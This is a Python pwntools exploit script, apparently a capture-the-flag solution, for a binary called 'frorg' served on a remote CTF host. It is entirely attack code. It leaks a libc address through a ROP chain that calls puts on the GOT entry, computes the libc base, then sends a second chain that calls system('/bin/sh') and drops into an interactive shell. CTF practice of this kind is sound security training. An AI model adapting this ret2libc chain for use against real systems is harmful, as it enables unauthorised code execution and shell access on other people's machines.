#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("frorg_patched")
libc = ELF("./libc.so.6")

local = False 
if local:
    p = process("./frorg_patched")
    gdb.attach(p,'''b*0x40128e\nc\nb*0x40128e\nc''')
else:
    p = remote('byuctf.xyz', 40015)

elf = context.binary = ELF('./frorg_patched', checksec=False)

def number(num):
    p.sendlineafter(b"store?", str(num))

def name_f(data):
    p.sendafter(b"name:",data)
    print("Send name")

ret = 0x4011e6
pop_rdi = 0x4011e5
puts_plt = 0x401070
puts_got = 0x404000
main = 0x4011ea
print("[+]POP_RDI:  ", hex(pop_rdi))
print("[+]PUTS_GOT: ", hex(puts_got))
print("[+]PUTS_PLT: ", hex(puts_plt))
print("[+]MAIN:     ", hex(main))

#####################
# Step_1: Leak_libc #
#####################

number(9)
for i in range(5):
    name_f(str(i))
name_f(b"123456" + p32(pop_rdi))

name_f(p32(0x0) + p32(puts_got) + b"\x00"*2)
name_f(b"\x00"*2 + p32(puts_plt) + p32(0x0))
name_f(p64(main))

p.recvuntil(b"Thank you!\n")

libc.address = int.from_bytes(p.recv(6), "little") - 510432
print("[+]Libc_base:    ", hex(libc.address))
print("[+]Libc_binsh:   ", hex(next(libc.search(b'/bin/sh'))))
print("[+]Libc_system:  ", hex(libc.sym['system']))

#####################
# Step_2: Get_shell #
#####################

number(9)
for i in range(5):
    name_f(str(i))
name_f(b"123456" + p32(ret))

a1 = pop_rdi & 0xffffffff
a2 = pop_rdi >> 4*8
print(hex(a1))
print(hex(a2))
name_f(p32(0x0) + p32(a1) + p16(a2))
name_f(b"\x00"*2 + p64(next(libc.search(b'/bin/sh'))))
name_f(p64(libc.sym['system']))
p.interactive()